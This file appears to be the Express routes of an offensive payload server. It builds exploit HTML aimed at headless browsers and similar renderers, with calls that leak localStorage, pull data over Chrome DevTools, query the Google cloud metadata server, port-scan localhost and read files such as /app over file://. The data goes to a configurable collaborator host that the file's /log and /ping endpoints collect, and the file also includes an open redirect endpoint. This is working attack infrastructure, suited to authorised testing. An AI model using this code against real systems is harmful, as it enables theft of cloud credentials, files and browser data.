const url = require("url");
const fs = require("fs");
const path = require("path");
const express = require("express");
const routes = express.Router();

// Load the base HTML template
const templatePath = path.join(__dirname, "htmls", "js-exploits.html");
const templateHtml = fs.readFileSync(templatePath, 'utf8');

// Function call mappings
const functionCalls = {
    localStorage: 'localStorageLeak();',
    chromeHeadless: 'chromeHeadless();',
    cdpExtract: 'cdpExtractData(wsUrl);', // requires wsUrl param
    browserInfo: 'getBrowserInfo();',
    cloudMetadata: 'cloudMetadata(googleMetadataServer, googleMetadataPaths, googleHeaders);',
    portScanner: 'portScanner("127.0.0.1", commonPorts);',
    fileRead: 'fileProtocolRead(sensitiveFiles);',
    fileList: 'fileProtocolListDir("/app"); fileProtocolListDir("/");'
};

function generatePayload(config, functions, wsUrl) {
    let html = templateHtml;

    // Set collaborator URL if specified via -c flag
    if (config.collaborator) {
        html = html.replace(
            /var collaboratorUrl = window\.location\.protocol \+ "\/\/" \+ window\.location\.host;/,
            `var collaboratorUrl = window.location.protocol + "//" + "${config.collaborator}";`
        );
    }

    // Build function calls based on requested functions
    let calls = '\n//Auto-generated function calls\n';

    if (functions.includes('all')) {
        functions = Object.keys(functionCalls).filter(f => f !== 'cdpExtract');
    }

    functions.forEach(func => {
        if (functionCalls[func]) {
            if (func === 'cdpExtract' && wsUrl) {
                calls += `cdpExtractData("${wsUrl}");\n`;
            } else if (func !== 'cdpExtract') {
                calls += functionCalls[func] + '\n';
            }
        }
    });

    // Insert calls before closing </script>
    html = html.replace('</script>', calls + '</script>');

    return html;
}

routes.get("/", (req, res) => {
    console.log("Connection received: " + req.socket.remoteAddress);

    const config = req.app.locals.config;
    config.req = req;

    const urlParts = url.parse(req.url, true);
    const query = urlParts.query;

    // Get functions from ?f= parameter (default: all)
    const functionsParam = query.f || 'all';
    const functions = functionsParam.split(',').map(f => f.trim()).filter(f => f);

    // Get optional wsUrl for cdpExtract
    const wsUrl = query.wsUrl || null;

    // Generate dynamic payload (works with or without ?f= param)
    const payload = generatePayload(config, functions, wsUrl);
    res.type('html').send(payload);
});

// No-JS tracking endpoint (triggered by <img>, <link>, etc.)
routes.get("/ping", (req, res) => {
    const type = req.query.type || 'unknown';
    const ua = req.get('User-Agent') || 'Unknown';

    console.log("[PING] type=" + type + " ip=" + req.socket.remoteAddress + " ua=" + ua);

    // Return 1x1 transparent pixel
    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.type('image/gif').send(pixel);
});

routes.get("/log", (req, res) => {
    console.log("Connection received: " + req.socket.remoteAddress);

    const urlParts = url.parse(req.url, true);
    const msg = urlParts.query.msg;

    if (msg) {
        try {
            const decoded = Buffer.from(msg, 'base64').toString('utf8');
            console.log("[LOG] " + decoded);
        } catch (e) {
            console.log("[RAW] " + msg);
        }
    }

    return res.send("Ok");
});

routes.post("/log", (req, res) => {
    console.log("Connection received: " + req.socket.remoteAddress);
    console.log("[LOG] " + JSON.stringify(req.body));

    return res.send("Ok");
});

routes.get("/openredirect*", (req, res) => {
    console.log("Connection received: " + req.socket.remoteAddress);

    var urlParts = url.parse(req.url, true);
    var query = urlParts.query;

    var redirectUrl = query.url;

    if (redirectUrl != undefined){
        return res.redirect(redirectUrl);
    }else{
        return res.send("Missing 'url' parameter.");
    }
});

routes.post("/openredirect*", (req, res) => {
    console.log("Connection received: " + req.socket.remoteAddress);

    var urlParts = url.parse(req.url, true);
    var query = urlParts.query;

    var redirectUrl = query.url;

    if (redirectUrl != undefined){
        return res.redirect(redirectUrl);
    }else{
        return res.send("Missing 'url' parameter.");
    }
});

module.exports = routes;
